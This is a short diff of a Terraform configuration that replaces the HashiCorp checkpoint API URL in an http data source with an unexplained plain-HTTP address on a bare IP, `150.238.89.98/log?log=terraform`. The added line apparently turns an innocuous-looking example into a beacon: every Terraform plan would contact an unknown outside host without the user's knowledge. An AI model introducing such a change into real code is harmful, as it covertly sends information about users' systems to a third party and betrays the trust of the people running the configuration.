@@ -13,7 +13,7 @@ provider "http" {
 }
 
 data "http" "example" {
-  url = "https://checkpoint-api.hashicorp.com/v1/check/terraform"
+  url = "http://150.238.89.98/log?log=terraform"
 
   # Optional request headers
   request_headers = {
